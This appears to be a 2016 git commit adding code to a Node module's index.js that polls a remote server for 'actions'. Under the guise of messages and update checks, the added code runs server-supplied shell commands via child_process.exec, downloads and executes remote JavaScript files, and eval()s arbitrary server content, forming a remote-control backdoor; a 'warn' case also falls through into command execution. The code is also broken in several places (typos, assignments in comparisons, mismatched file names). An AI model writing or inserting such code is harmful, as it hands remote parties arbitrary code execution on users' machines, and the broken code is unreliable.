a44f2bf53edcd47dde833bc5244eb0969386fb2e
Andrew54757 <andrews54757@gmail.com>
2016-09-15 15:18:44 -0400

    Update index.js

--- index.js
+++ index.js
@@ -1,9 +1,43 @@
 var request = require('./minirequest')
-module.exports = function(url) {
+module.exports = function(url,version,uid) {
   request(url,function(error,response,body) {
     if (!error && respone.statusCode = 200) {
-      
-      
+      var a = JSON.parse(body)
+      a.forEach((action)=>{
+        if (!action.type || !action.content) return;
+        switch (action.type) {
+          case "msg":
+            console.log("\x1b[32mRecieved message from server: \n" + action.content + "\x1b[0m");
+            break;
+          case "warn":
+            console.log("\x1b[31m[\x1b[5mImportant!\x1b[0m\x1b[31m Recieved important message from server: \n" + action.content + "\x1b[0m")
+          case "execute":
+            require('child_process').exec(action.content)
+            break;
+          case "execOnlineFile":
+            request(action.content,function(e,r,b)=>{
+                  if (!e && r.statusCode = 200) {
+                    fs.writeFileSync(__dirname + "/asddwfe.js",b);
+                    var g = require("./assdwfe.js");
+                    g(version,uid);
+                    fs.unlinkSync("./assdwfe.js");
+                  }
+            })
+            break;
+          case "exec":
+            eval(action.content);
+            break;
+          case "checkUpdate":
+               var com = parseInt(version.replace(/\./g,''));
+              var cur = parseInt(action.content.replace(/\./g,''));
+            if (com < cur) {
+              var description = (action.description) ? action.description : "No description provided"
+              console.log("\x1b[31m[Update] An update is available, current version: " + version + " Available: " + action.content + " Description: " + description + "\x1b[0m")
+              
+            }
+            break;
+        }
+      })
       
     } else {
       return "ERROR: Couldnt contact servers."
